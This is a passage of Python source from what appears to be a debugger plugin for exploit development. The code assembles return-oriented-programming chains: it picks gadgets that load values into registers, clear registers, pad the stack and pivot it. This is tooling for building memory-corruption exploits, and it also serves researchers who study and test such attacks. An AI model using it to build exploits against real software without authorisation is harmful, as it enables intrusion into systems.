							junksize = getJunk(interestinggadgets[negptr])
							putchain.append([negptr,"",junksize])
							movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
							for movesteps in movechain:
								putchain.append([movesteps[0],movesteps[1],movesteps[2]])
							gadgetfound = True
							break
		if not gadgetfound:
			# can we do this using add/sub via another register ?
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					fromreg = movetype.split(" ")[1]
					if "pop "+ fromreg in suggestions and "add value to " + fromreg in suggestions:
						# check each value & see if delta meets pointer criteria
						#dbg.log("move %s into %s" % (fromreg,reg))
						for addinstr in suggestions["add value to " + fromreg]:
							if not gadgetfound:
								theinstr = interestinggadgets[addinstr][3:len(interestinggadgets[addinstr])]
								#dbg.log("%s" % theinstr)
								instrparts = theinstr.split("#")
								totalvalue = 0
								#gadget might contain multiple add/sub instructions
								for indivinstr in instrparts:
									instrvalueparts = indivinstr.split(',')
									if len(instrvalueparts) > 1:
										# only look at real values
										if isHexValue(instrvalueparts[1].rstrip()):
											thisval = hexStrToInt(instrvalueparts[1])
											if instrvalueparts[0].lstrip().startswith("add"):
												totalvalue += thisval
											if instrvalueparts[0].lstrip().startswith("sub"):
												totalvalue -= thisval
								# subtract totalvalue from target value
								if totalvalue > 0:
									deltaval = value - totalvalue
									if deltaval < 0:
										deltaval = 0xffffffff + deltaval + 1
									deltavalhex = toHex(deltaval)
									if meetsCriteria(MnPointer(deltaval),criteria):
										#dbg.log("   Instruction : %s, Delta : %s, To pop in reg : %s" % (theinstr,toHex(totalvalue),deltavalhex),highlight=1)
										popptr = getShortestGadget(suggestions["pop "+fromreg])
										junksize = getJunk(interestinggadgets[popptr])-4
										putchain.append([popptr,"",junksize])
										putchain.append([deltaval,"put delta into " + fromreg + " (-> put 0x" + toHex(value) + " into " + reg + ")",0])
										junksize = getJunk(interestinggadgets[addinstr])
										putchain.append([addinstr,"",junksize])
										movptr = getShortestGadget(suggestions["move "+fromreg + " -> " + reg])
										junksize = getJunk(interestinggadgets[movptr])
										putchain.append([movptr,"",junksize])
										gadgetfound = True
									
		if not gadgetfound:
			if "pop " + reg in suggestions and "neg "+reg in suggestions and "dec "+reg in suggestions:
				toinc = 0
				while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
					toinc += 1
					if toinc > 250:
						break
				if toinc <= 250:
					popptr = getShortestGadget(suggestions["pop "+reg])
					junksize = getJunk(interestinggadgets[popptr])-4
					putchain.append([popptr,"",junksize])
					putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
					negptr = getShortestGadget(suggestions["neg "+reg])
					cnt = 0
					decptr = getShortestGadget(suggestions["dec "+reg])
					junksize = getJunk(interestinggadgets[negptr])
					putchain.append([negptr,"",junksize])
					junksize = getJunk(interestinggadgets[decptr])
					while cnt < toinc:
						putchain.append([decptr,"",junksize])
						cnt += 1
					gadgetfound = True
				
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions and "dec "+fromreg in suggestions:
							toinc = 0							
							while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
								toinc += 1
								if toinc > 250:
									break
							if toinc <= 250:
								popptr = getShortestGadget(suggestions["pop "+fromreg])
								junksize = getJunk(interestinggadgets[popptr])-4
								putchain.append([popptr,"",junksize])
								putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
								negptr = getShortestGadget(suggestions["neg "+fromreg])
								junksize = getJunk(interestinggadgets[negptr])
								cnt = 0
								decptr = getShortestGadget(suggestions["dec "+fromreg])
								putchain.append([negptr,"",junksize])
								junksize = getJunk(interestinggadgets[decptr])
								while cnt < toinc:
									putchain.append([decptr,"",junksize])
									cnt += 1
								movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
								for movesteps in movechain:
									putchain.append([movesteps[0],movesteps[1],movesteps[2]])
								gadgetfound = True
								break
							
			if not gadgetfound and "pop " + reg in suggestions and "neg "+reg in suggestions and "inc "+reg in suggestions:
				toinc = 0
				while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
					toinc -= 1
					if toinc < -250:
						break
				if toinc > -250:
					popptr = getShortestGadget(suggestions["pop "+reg])
					junksize = getJunk(interestinggadgets[popptr])-4
					putchain.append([popptr,"",junksize])
					putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
					negptr = getShortestGadget(suggestions["neg "+reg])
					junksize = getJunk(interestinggadgets[negptr])
					putchain.append([negptr,"",junksize])				
					incptr = getShortestGadget(suggestions["inc "+reg])
					junksize = getJunk(interestinggadgets[incptr])
					while toinc < 0:
						putchain.append([incptr,"",junksize])
						toinc += 1
					gadgetfound = True
				
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions and "inc "+fromreg in suggestions:
							toinc = 0							
							while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
								toinc -= 1	
								if toinc < -250:
									break
							if toinc > -250:
								popptr = getShortestGadget(suggestions["pop "+fromreg])
								junksize = getJunk(interestinggadgets[popptr])-4
								putchain.append([popptr,""])
								putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value)])
								negptr = getShortestGadget(suggestions["neg "+fromreg])
								junksize = getJunk(interestinggadgets[negptr])
								putchain.append([negptr,"",junksize])							
								decptr = getShortestGadget(suggestions["inc "+fromreg])
								junksize = getJunk(interestinggadgets[incptr])
								while toinc < 0 :
									putchain.append([incptr,"",junksize])
									toinc += 1
								movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
								for movesteps in movechain:
									putchain.append([movesteps[0],movesteps[1],movesteps[2]])
								gadgetfound = True
								break
							
		if not gadgetfound and "add value to " + reg in suggestions and "pop " + reg in suggestions:
			addtypes = ["add","adc","xor", "sub"]
			for addtype in addtypes:
				for ptrs in suggestions["add value to " + reg]:
					thisinstr = interestinggadgets[ptrs]
					thisparts = thisinstr.split("#")
					addinstr = thisparts[1].lstrip().split(",")
					if thisparts[1].startswith(addtype):
						if addtype == "add" or addtype == "adc":
							addvalue = hexStrToInt(addinstr[1])
							delta = value - addvalue
							if delta < 0:
								delta = 0xffffffff + delta + 1
						if addtype == "xor":
							delta = hexStrToInt(addinstr[1]) ^ value
						if addtype == "sub":
							addvalue = hexStrToInt(addinstr[1])
							delta = value + addvalue
							if delta < 0:
								delta = 0xffffffff + delta + 1							
						if meetsCriteria(MnPointer(delta),criteria):
							popptr = getShortestGadget(suggestions["pop "+reg])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([delta,"Diff to desired value",0])
							junksize = getJunk(interestinggadgets[ptrs])
							putchain.append([ptrs,"",junksize])
							gadgetfound = True
							break
							
		if not gadgetfound:
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					fromreg = movetype.split(" ")[1]		
					if "add value to " + fromreg in suggestions and "pop " + fromreg in suggestions:
						addtypes = ["add","adc","xor","sub"]
						for addtype in addtypes:
							for ptrs in suggestions["add value to " + fromreg]:
								thisinstr = interestinggadgets[ptrs]
								thisparts = thisinstr.split("#")
								addinstr = thisparts[1].lstrip().split(",")
								if thisparts[1].startswith(addtype):
									if addtype == "add" or addtype == "adc":
										addvalue = hexStrToInt(addinstr[1])
										delta = value - addvalue
										if delta < 0:
											delta = 0xffffffff + delta + 1
									if addtype == "xor":
										delta = hexStrToInt(addinstr[1]) ^ value
									if addtype == "sub":
										addvalue = hexStrToInt(addinstr[1])
										delta = value + addvalue
										if delta < 0:
											delta = 0xffffffff + delta + 1												
									#dbg.log("0x%s : %s, delta : 0x%s" % (toHex(ptrs),thisinstr,toHex(delta)))
									if meetsCriteria(MnPointer(delta),criteria):
										popptr = getShortestGadget(suggestions["pop "+fromreg])
										junksize = getJunk(interestinggadgets[popptr])-4
										putchain.append([popptr,"",junksize])
										putchain.append([delta,"Diff to desired value",0])
										junksize = getJunk(interestinggadgets[ptrs])
										putchain.append([ptrs,"",junksize])
										movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
										for movesteps in movechain:
											putchain.append([movesteps[0],movesteps[1],movesteps[2]])
										gadgetfound = True
										break
		if not gadgetfound and "inc " + reg in suggestions and value <= 64:
			cnt = 0
			# can we clear the reg ?
			clearsteps = clearReg(reg,suggestions,interestinggadgets)
			for cstep in clearsteps:
				putchain.append([cstep[0],cstep[1],cstep[2]])			
			# inc
			incptr = getShortestGadget(suggestions["inc "+reg])
			junksize = getJunk(interestinggadgets[incptr])
			while cnt < value:
				putchain.append([incptr,"",junksize])
				cnt += 1
			gadgetfound = True
		if not gadgetfound:
			putchain.append([0,"[-] Unable to find gadget to put " + toHex(value) + " into " + reg,0])
	return putchain

def getGadgetMoveRegToReg(fromreg,toreg,suggestions,interestinggadgets):
	movechain = []
	movetype = "move " + fromreg + " -> " + toreg
	if movetype in suggestions:
		moveptr = getShortestGadget(suggestions[movetype])
		moveinstr = interestinggadgets[moveptr].lstrip()
		if moveinstr.startswith("# xor") or moveinstr.startswith("# or") or moveinstr.startswith("# ad"):
			clearchain = clearReg(toreg,suggestions,interestinggadgets)
			for cc in clearchain:
				movechain.append([cc[0],cc[1],cc[2]])
		junksize = getJunk(interestinggadgets[moveptr])		
		movechain.append([moveptr,"",junksize])
	else:
		movetype1 = "xor " + fromreg + " -> " + toreg
		movetype2 = "xor " + toreg + " -> " + fromreg
		if movetype1 in suggestions and movetype2 in suggestions:
			moveptr1 = getShortestGadget(suggestions[movetype1])
			junksize = getJunk(interestinggadgets[moveptr1])
			movechain.append([moveptr1,"",junksize])
			moveptr2 = getShortestGadget(suggestions[movetype2])
			junksize = getJunk(interestinggadgets[moveptr2])
			movechain.append([moveptr2,"",junksize])
	return movechain

def clearReg(reg,suggestions,interestinggadgets):
	clearchain = []
	clearfound = False
	if not "clear " + reg in suggestions:
		if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
			# maybe it will work using a move from another register
			for inctype in suggestions:
				if inctype.startswith("inc"):
					increg = inctype.split(" ")[1]
					iptr = getShortestGadget(suggestions["inc " + increg])
					for movetype in suggestions:
						if movetype == "move " + increg + " -> " + reg and "pop " + increg in suggestions:
							moveptr = getShortestGadget(suggestions[movetype])
							moveinstr = interestinggadgets[moveptr].lstrip()
							if not(moveinstr.startswith("# xor") or moveinstr.startswith("# or") or moveinstr.startswith("# ad")):
								#kewl
								pptr = getShortestGadget(suggestions["pop " + increg])
								junksize = getJunk(interestinggadgets[pptr])-4
								clearchain.append([pptr,"",junksize])
								clearchain.append([0xffffffff," ",0])
								junksize = getJunk(interestinggadgets[iptr])
								clearchain.append([iptr,"",junksize])
								junksize = getJunk(interestinggadgets[moveptr])
								clearchain.append([moveptr,"",junksize])
								clearfound = True
								break
			if not clearfound:				
				clearchain.append([0,"[-] Unable to find a gadget to clear " + reg,0])
		else:
			#pop FFFFFFFF into reg, then do inc reg => 0
			pptr = getShortestGadget(suggestions["pop " + reg])
			junksize = getJunk(interestinggadgets[pptr])-4
			clearchain.append([pptr,"",junksize])
			clearchain.append([0xffffffff," ",0])
			iptr = getShortestGadget(suggestions["inc " + reg])
			junksize = getJunk(interestinggadgets[iptr])
			clearchain.append([iptr,"",junksize])
	else:
		shortest_clear = getShortestGadget(suggestions["clear " + reg])
		junksize = getJunk(interestinggadgets[shortest_clear])
		clearchain.append([shortest_clear,"",junksize])
	return clearchain
	
def getGadgetValueToReg(reg,value,suggestions,interestinggadgets):
	negfound = False
	blocktxt = ""
	blocktxt2 = ""	
	tonegate = 4294967296 - value
	nregs = ["eax","ebx","ecx","edx","edi"]
	junksize = 0
	junk2size = 0
	negateline = "      0x" + toHex(tonegate)+",  # value to negate, target value : 0x" + toHex(value) + ", target reg : " + reg +"\n"
	if "neg " + reg in suggestions:
		negfound = True
		negptr = getShortestGadget(suggestions["neg " + reg])
		if "pop "+reg in suggestions:
			pptr = getShortestGadget(suggestions["pop " + reg])
			blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
			blocktxt2 += negateline
			junk2size = getJunk(interestinggadgets[pptr])-4
		else:
			blocktxt2 += "      0x????????,#  find a way to pop the next value into " + reg + "\n"					
			blocktxt2 += negateline			
		blocktxt2 += "      0x" + toHex(negptr)+",  "+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
		junksize = getJunk(interestinggadgets[negptr])-4
		
	if not negfound:
		nregs.remove(reg)
		for thisreg in nregs:
			if "neg "+ thisreg in suggestions and not negfound:
				blocktxt2 = ""
				junk2size = 0
				negfound = True
				#get pop first
				if "pop "+thisreg in suggestions:
					pptr = getShortestGadget(suggestions["pop " + thisreg])
					blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
					blocktxt2 += negateline
					junk2size = getJunk(interestinggadgets[pptr])-4
				else:
					blocktxt2 += "      0x????????,#  find a way to pop the next value into "+thisreg+"\n"					
					blocktxt2 += negateline				
				negptr = getShortestGadget(suggestions["neg " + thisreg])
				blocktxt2 += "      0x" + toHex(negptr)+",  "+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
				junk2size = junk2size + getJunk(interestinggadgets[negptr])-4				
				#now move it to reg
				if "move " + thisreg + " -> " + reg in suggestions:
					bptr = getShortestGadget(suggestions["move " + thisreg + " -> " + reg])
					if interestinggadgets[bptr].strip().startswith("# add"):
						if not "clear " + reg in suggestions:
							# other way to clear reg, using pop + inc ?
							if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
								blocktxt2 += "      0x????????,  # find pointer to clear " + reg+"\n"
							else:
								#pop FFFFFFFF into reg, then do inc reg => 0
								pptr = getShortestGadget(suggestions["pop " + reg])
								blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"
								blocktxt2 += "      0xffffffff,  # pop value into " + reg + "\n"
								blocktxt2 += createJunk(getJunk(interestinggadgets[pptr])-4)
								iptr = getShortestGadget(suggestions["inc " + reg])
								blocktxt2 += "      0x" + toHex(iptr)+",  "+interestinggadgets[iptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"								
								junksize += getJunk(interestinggadgets[iptr])
						else:
							clearptr = getShortestGadget(suggestions["empty " + reg])
							blocktxt2 += "      0x" + toHex(clearptr)+",  "+interestinggadgets[clearptr].strip()+" ("+MnPointer(clearptr).belongsTo()+")\n"	
							junk2size = junk2size + getJunk(interestinggadgets[clearptr])-4
					blocktxt2 += "      0x" + toHex(bptr)+",  "+interestinggadgets[bptr].strip()+" ("+MnPointer(bptr).belongsTo()+")\n"
					junk2size = junk2size + getJunk(interestinggadgets[bptr])-4
				else:
					negfound = False
	if negfound: 
		blocktxt += blocktxt2
	else:
		blocktxt = ""
	junksize = junksize + junk2size
	return blocktxt,junksize

def getOffset(instructions):
	offset = 0
	instrparts = instructions.split("#")
	retpart = instrparts[len(instrparts)-1].strip()
	retparts = retpart.split(" ")
	if len(retparts) > 1:
		offset = hexStrToInt(retparts[1])
	return offset
	
def getJunk(instructions):
	junkpop = instructions.count("pop ") * 4
	junkpush = instructions.count("push ") * -4
	junkpushad = instructions.count("pushad ") * -32
	junkpopad = instructions.count("popad") * 32
	junkinc = instructions.count("inc esp") * 1
	junkdec = instructions.count("dec esp") * -1
	junkesp = 0
	if instructions.find("add esp,") > -1:
		instparts = instructions.split("#")
		for part in instparts:
			thisinstr = part.strip()
			if thisinstr.startswith("add esp,"):
				value = thisinstr.split(",")
				junkesp += hexStrToInt(value[1])
	if instructions.find("sub esp,") > -1:
		instparts = instructions.split("#")
		for part in instparts:
			thisinstr = part.strip()
			if thisinstr.startswith("sub esp,"):
				value = thisinstr.split(",")
				junkesp -= hexStrToInt(value[1])
	junk = junkpop + junkpush + junkpopad + junkpushad + junkesp
	return junk

def createJunk(size,message="filler (compensate)",alignsize=0):
	bytecnt = 0
	dword = 0
	junktxt = ""
	while bytecnt < size:
		dword = 0
		junktxt += "      0x"
		while dword < 4 and bytecnt < size :
			junktxt += "41"
			dword += 1
			bytecnt += 1
		junktxt += ","
		junktxt += toSize("",alignsize + 4 - dword)
		junktxt += "  # "+message+"\n"
	return junktxt

	
def getShortestGadget(chaintypedict):
	shortest = 100
	shortestptr = 0
	shortestinstr = "A" * 1000
	thischaindict = chaintypedict.copy()
	#shuffle dict so returning ptrs would be different each time
	while thischaindict:
		typeptr, thisinstr = random.choice(list(thischaindict.items()))

		if thisinstr.startswith("# xor") or thisinstr.startswith("# or") or thisinstr.startswith("# ad"):
			thisinstr += "     "	# make sure we don prefer MOV or XCHG
		thiscount = thisinstr.count("#")
		thischaindict.pop(typeptr)
		if thiscount < shortest:
			shortest = thiscount
			shortestptr = typeptr
			shortestinstr = thisinstr
		else:
			if thiscount == shortest:
				if len(thisinstr) < len(shortestinstr):
					shortest = thiscount
					shortestptr = typeptr
					shortestinstr = thisinstr
	return shortestptr

def isInterestingGadget(instructions):
	if isAsciiString(instructions):
		interesting =	[
						"pop e", "xchg e", "lea e", "push e", "xor e", "and e", "neg e", 
						"or e", "add e", "sub e", "inc e", "dec e", "popad", "pushad",
						"sub a", "add a", "nop", "adc e",
						"sub bh", "sub bl", "add bh", "add bl", 
						"sub ch", "sub cl", "add ch", "add cl",
						"sub dh", "sub dl", "ADD DH", "add dl",
						"mov e", "clc", "cld", "fs:", "fpa", "test "
						]

		notinteresting = [ "mov esp", "lea esp"	]
		regs = dbglib.Registers32BitsOrder[:]
		if arch == 64:
			interesting.extend(["pop r", "xchg r", "lea r", "push r", "xor r", "and r", "neg r", "or r", "add r",
			                    "sub r", "inc r", "dec r", "sub r", "add r", "adc r", "mov r"])
			notinteresting.extend(["mov rsp", "lea rsp"])
			regs.extend(dbglib.Registers64BitsOrder)
		individual = instructions.split("#")
		cnt = 0
		allgood = True
		toskip = False
		while (cnt < len(individual)-1) and allgood:	# do not check last one, which is the ending instruction
			thisinstr = individual[cnt].strip().lower()
			if thisinstr != "":
				toskip = False
				foundinstruction = False
				for notinterest in notinteresting:
					if thisinstr.find(notinterest) > -1:
						toskip= True 
				if not toskip:
					for interest in interesting:
						if thisinstr.find(interest) > -1:
							foundinstruction = True
					if not foundinstruction:
						#check the conditional instructions
						if thisinstr.find("mov dword ptr ds:[e") > -1:
							thisinstrparts = thisinstr.split(",")
							if len(thisinstrparts) > 1:
								if thisinstrparts[1] in regs:
									foundinstruction = True
						# other exceptions - don't combine ADD BYTE or ADD DWORD with XCHG EAX,ESI - EAX may not be writeable
						#if instructions.strip().startswith("# XCHG") and (thisinstr.find("ADD DWORD") > -1 or thisinstr.find("ADD BYTE") > -1) and not instructions.strip().startswith("# XCHG EAX,ESI") :
							# allow - tricky case, but sometimes needed
						#	foundinstruction = True
					allgood = foundinstruction
				else:
					allgood = False
			cnt += 1
		return allgood
	return False
	
def isInterestingJopGadget(instructions):
	interesting =	[
					"pop e", "xchg e", "lea e", "push e", "xor e", "and e", "neg e", 
					"or e", "add e", "sub e", "inc e", "dec e", "popad", "pushad",
					"sub a", "add a", "nop", "adc e",
					"sub bh", "sub bl", "add bh", "add bl", 
					"sub ch", "sub cl", "add ch", "add cl",
					"sub dh", "sub dl", "ADD DH", "add dl",
					"mov e", "clc", "cld", "fs:", "fpa", "test "
					]
	notinteresting = [ "mov esp,", "lea esp"]
	regs = dbglib.Registers32BitsOrder[:]
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	popfound = False
	toskip = False
	# what is the jmp instruction ?
	lastinstruction = individual[len(individual)-1].replace("[","").replace("+"," ").replace("]","").strip()
	
	jmp = lastinstruction.split(' ')[1].strip().lower().replace(" ","")
	
	dbgp("jmp instruction : %s" % jmp)
	if jmp in regs:
		regs.remove(jmp)
	else:
		dbgp("jmp instruction %s not in regs list, something wrong?" % jmp)
		dbgp("regs list: %s" % regs)
	if jmp != "esp":
		if instructions.find("pop "+jmp) > -1:
			popfound=True
		else:
			for reg in regs:
				poploc = instructions.find("pop "+reg)
				if (poploc > -1):
					if (instructions.find("mov "+reg+","+jmp) > poploc) or (instructions.find("xchg "+reg+","+jmp) > poploc) or (instructions.find("xchg "+jmp+","+reg) > poploc):
						popfound = True
		allgood = popfound
	return allgood


def readGadgetsFromFile(filename):
	"""
	Reads a mona/msf generated rop file 
	
	Arguments :
	filename - the full path + filename of the source file
	
	Return :
	dictionary containing the gadgets (grouped by ending type)
	"""
	
	readopcodes = {}
	
	srcfile = open(filename,"rb")
	content = srcfile.readlines()
	srcfile.close()
	msffiledetected = False
	#what kind of file do we have
	for thisLine in content:
		if thisLine.find("mod:") > -1 and thisLine.find("ver:") > -1 and thisLine.find("VA") > -1:
			msffiledetected = True
			break
	if msffiledetected:
		dbg.log("[+] Importing MSF ROP file...")
		addrline = 0
		ending = ""
		thisinstr = ""
		thisptr = ""
		for thisLine in content:
			if thisLine.find("[addr:") == 0:
				thisLineparts = thisLine.split("]")
				if addrline == 0:	
					thisptr = hexStrToInt(thisLineparts[0].replace("[addr: ",""))
				thisLineparts = thisLine.split("  ")
				thisinstrpart = thisLineparts[len(thisLineparts)-1].lower().strip()
				if thisinstrpart != "":
					thisinstr += " # " + thisinstrpart
					ending = thisinstrpart
				addrline += 1
			else:
				addrline = 0
				if thisptr != "" and ending != "" and thisinstr != "":
					if not ending in readopcodes:
						readopcodes[ending] = [thisptr,thisinstr]
					else:
						readopcodes[ending] += ([thisptr,thisinstr])
				thisptr = ""
				ending = ""
				thisinstr = ""
		
	else:
		dbg.log("[+] Importing Mona legacy ROP file...")
		for thisLine in content:
			if isAsciiString(thisLine.replace("\r","").replace("\n","")):
				refpointer,instr = splitToPtrInstr(thisLine)
				if refpointer != -1:
					#get ending
					instrparts = instr.split("#")
					ending = instrparts[len(instrparts)-1]
					if not ending in readopcodes:
						readopcodes[ending] = [refpointer,instr]
					else:
						readopcodes[ending] += ([refpointer,instr])
	return readopcodes
	
def isGoodGadgetPtr(gadget,criteria):
	#if DEBUG_MODE:
	#	dbgp(get_current_function_name())
	_ensureMnProc()
	if gadget in mnproc.CritCache:
		return mnproc.CritCache[gadget]
	else:
		gadgetptr = MnPointer(gadget)
		status = meetsCriteria(gadgetptr,criteria)
		mnproc.CritCache[gadget] = status
		return status
		
def getStackPivotDistance(gadget,distance=0):
	offset = 0
	distance_str = str(distance).lower()
	mindistance = 0
	maxdistance = 0

	if "," not in distance_str:
		# only mindistance
		maxdistance = 99999999
		mindistance = to_int(distance_str)
	else:
		mindistance, maxdistance = distance_str.split(",")
		mindistance = to_int(mindistance)
		maxdistance = to_int(maxdistance)

	gadgets = filter(lambda x: x.strip(), gadget.split(" # "))

	dbgp("Finding pivot distance in %s " % gadget)

	if arch == 32:
		for g in gadgets:
			if "add esp," in g:
				offset += hexStrToInt(g.split(",")[1])
			elif "sub esp," in g:
				offset += hexStrToInt(g.split(",")[1])
			elif "inc esp" in g:
				offset += 1
			elif "dec esp" in g:
				offset -= 1
			elif "pop " in g:
				offset += 4
			elif "push " in g:
				offset -= 4
			elif "popad" in g:
				offset += 32
			elif "pushad" in g:
				offset -= 32
			elif ("dword ptr" in g or "[" in g) and "fs" not in g:
				return 0
			
	if arch == 64:
		for g in gadgets:
			if "add rsp," in g:
				offset += hexStrToInt(g.split(",")[1])
			elif "sub rsp," in g:
				offset += hexStrToInt(g.split(",")[1])
			elif "inc rsp" in g:
				offset += 1
			elif "dec rsp" in g:
				offset -= 1
			elif "pop " in g:
				offset += 8
			elif "push " in g:
				offset -= 8
			elif ("qword ptr" in g or "[" in g) and "fss" not in g:
				return 0
				
	dbgp("   Distance found: %d" % offset)

	if mindistance <= offset and offset <= maxdistance:
		return offset
	else:
		return 0
		
def isGoodGadgetInstr(instruction):
	if isAsciiString(instruction):
		forbidden = [
					"???", "leave", "enter", "jmp ", "call ", "jb ", "jl ", "je ", "jnz ", "jz "
					"jge ", "jns ","sal ", "loop", "lock", "bound", "sar", "in ", 
					"out ", "rcl", "rcr", "rol", "ror", "shl", "shr", "int", "jecx",
					"jnp", "jpo", "jpe", "jcxz", "ja", "jb", "jna", "jnb", "jc", "jnc",
					"jg", "jle", "movs", "cmps", "scas", "lods", "stos", "rep", "repe",
					"repz", "repne", "repnz", "lds", "fst", "fist", "fmul", "fdivr", "imul"
					"fstp", "fst", "fld", "fdiv", "fxchg", "js ", "fidivr", "sbb",
					"salc", "cwde", "fcom", "lahf", "div", "jo", "out", "iret",
					"fild", "retf","halt","hlt","aam","finit","int3"
					]
		for instr in forbidden:
			if instruction.lower().find(instr) > -1:
				return False
		return True
	return False
	
def isGoodJopGadgetInstr(instruction):
	if isAsciiString(instruction):
		forbidden = [
					"???", "leave", "enter", "jmp ", "call ", "jb ", "jl ", "je ", "jnz ", "jz "
					"jge ", "jns ","sal ", "loop", "lock", "bound", "sar", "in ", 
					"out ", "rcl", "rcr", "rol", "ror", "shl", "shr", "int", "jecx",
					"jnp", "jpo", "jpe", "jcxz", "ja", "jb", "jna", "jnb", "jc", "jnc",
					"jg", "jle", "movs", "cmps", "scas", "lods", "stos", "rep", "repe",
					"repz", "repne", "repnz", "lds", "fst", "fist", "fmul", "fdivr", "imul"
					"fstp", "fst", "fld", "fdiv", "fxchg", "js ", "fidivr", "sbb",
					"salc", "cwde", "fcom", "lahf", "div", "jo", "out", "iret",
					"fild", "retf","halt","hlt","aam","finit","int3"
					]
		for instr in forbidden:
			if instruction.lower().find(instr) > -1:
				return False
		return True	
	return False

def isGadgetEnding(instruction,endings,verbosity=False):
	for ending in endings:
		if instruction.lower().find(ending.lower()) > -1:
			return True
	return False

def getRopSuggestion(ropchains,allchains):
	suggestions={}
	if arch == 32:
		arch_aware_regs = Registers32BitsOrder[:]
		arch_aware_regs.remove('esp')
	else:
		arch_aware_regs = Registers64BitsOrder[:]
		arch_aware_regs.remove('rsp')
	regs = Registers32BitsOrder[:]
	regs.remove('esp')
	if arch == 64:
		regs.extend(Registers64BitsOrder)
		regs.remove('rsp')

	# pushad
	# ======================
	if arch == 32: # we don't care about pushad in 64 bit
		pushad_allowed = [ "inc ","dec ","or ","xor ","lea ","add ","sub ", "pushad", "retn ", "nop", "pop ","push eax","push edi","adc ","fpatan","mov e" , "test ", "cmp "]
		for r in regs:
			rl = r.lower()
			pushad_allowed.append("mov "+rl+",dword ptr ds:[esp")	#stack
			pushad_allowed.append("mov "+rl+",dword ptr ss:[esp")	#stack
			pushad_allowed.append("mov "+rl+",dword ptr ds:[esi")	#virtualprotect
			pushad_allowed.append("mov "+rl+",dword ptr ss:[esi")	#virtualprotect
			pushad_allowed.append("mov "+rl+",dword ptr ds:[ebp")	#stack
			pushad_allowed.append("mov "+rl+",dword ptr ss:[ebp")	#stack
			for r2 in regs:
				r2l = r2.lower()
				pushad_allowed.append("mov "+rl+","+r2l)
				pushad_allowed.append("xchg "+rl+","+r2l)
				pushad_allowed.append("lea "+rl+","+r2l)
		pushad_notallowed = ["pop esp","popad","push esp","mov esp","add esp", "inc esp","dec esp","xor esp","lea esp","ss:","ds:"]
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip().lower()
			if gadgetinstructions.find("pushad") == 2:
				# does chain only contain allowed instructions
				# one pop is allowed, as long as it's not pop esp
				# push edi and push eax are allowed too (ropnop)
				if gadgetinstructions.count("pop ") < 2 and suggestedGadgetCheck(gadgetinstructions,pushad_allowed,pushad_notallowed):
					toadd={}
					toadd[gadget] = ropchains[gadget].strip()
					if not "pushad" in suggestions:
						suggestions["pushad"] = toadd
					else:
						suggestions["pushad"] = mergeOpcodes(suggestions["pushad"],toadd)

	# pick up a pointer
	# =========================
	pickedupin = []
	resulthash = ""
	allowedpickup = True
	ptr_size_directive_l = PTR_SIZE_DIRECTIVE.lower()
	for r in arch_aware_regs:
		rl = r.lower()
		for r2 in arch_aware_regs:
			r2l = r2.lower()
			pickup_allowed = ["nop","retn ","inc ","dec ","or ","xor ","mov ","lea ","add ","sub ","pop","adc ","fpatan", "test ", "cmp "]
			pickup_target = ["mov "+rl+","+ptr_size_directive_l+" ss:["+r2l+"]", "mov "+rl+","+ptr_size_directive_l+" ds:["+r2l+"]"]
			pickup_allowed.append("mov "+rl+","+ptr_size_directive_l+" ss:["+r2l+"]")
			pickup_allowed.append("mov "+rl+","+ptr_size_directive_l+" ds:["+r2l+"]")
			pickup_notallowed = ["pop "+rl, "mov "+rl+",e", "lea "+rl+",e", "mov esp", "xor esp", "lea esp", "mov dword ptr", "dec esp"]
			if arch == 64:
				pickup_notallowed.extend(["mov rsp", "xor rsp", "lea rsp", "dec rsp", "mov qword ptr"])

			for gadget in ropchains:
				gadgetinstructions = ropchains[gadget].strip().lower()
				allowedpickup = False
				for allowed in pickup_target:
					if gadgetinstructions.find(allowed) == 2 and gadgetinstructions.count("dword ptr") == 1:
						allowedpickup = True
						break
				if allowedpickup:
					if suggestedGadgetCheck(gadgetinstructions,pickup_allowed,pickup_notallowed):
						toadd={}
						toadd[gadget] = ropchains[gadget].strip()
						resulthash = "pickup pointer into "+rl
						if not resulthash in suggestions:
							suggestions[resulthash] = toadd
						else:
							suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
						if not r in pickedupin:
							pickedupin.append(r)
	if len(pickedupin) == 0:
		for r in arch_aware_regs:
			rl = r.lower()
			for r2 in arch_aware_regs:
				r2l = r2.lower()
